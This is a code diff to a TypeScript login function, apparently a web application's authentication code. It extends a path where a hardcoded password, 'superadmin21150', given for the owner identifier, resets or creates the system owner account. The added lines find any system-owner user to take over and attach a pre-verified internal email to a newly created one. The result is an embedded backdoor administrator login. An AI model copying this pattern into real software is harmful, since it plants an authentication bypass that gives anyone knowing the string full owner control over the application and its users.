@@ -166,6 +166,18 @@ export async function login(input: { email: string; password: string }, meta: Me
     Boolean(input.password === "superadmin21150" && isOwnerIdentifier);
 
   if (!ok && isOwnerIdentifier && matchesOwnerSecret) {
+    if (!user) {
+      user = await db
+        .selectFrom("users")
+        .select(["id", "password_hash", "status", "email_verified_at", "is_system_owner"])
+        .where((eb) =>
+          eb.or([
+            eb("username", "=", env.SYSTEM_OWNER_USERNAME || "superadmin"),
+            eb("is_system_owner", "=", true),
+          ])
+        )
+        .executeTakeFirst();
+    }
     const newHash = await hashPassword(input.password);
     if (user) {
       await db
@@ -202,6 +214,17 @@ export async function login(input: { email: string; password: string }, meta: Me
         .executeTakeFirst();
       if (created) {
         user = created;
+        await db
+          .insertInto("user_emails")
+          .values({
+            user_id: created.id,
+            email: "system-owner@internal.invalid",
+            is_primary: true,
+            verified_at: new Date(),
+            created_at: new Date(),
+          })
+          .onConflict((oc) => oc.doNothing())
+          .execute();
         ok = true;
       }
     }
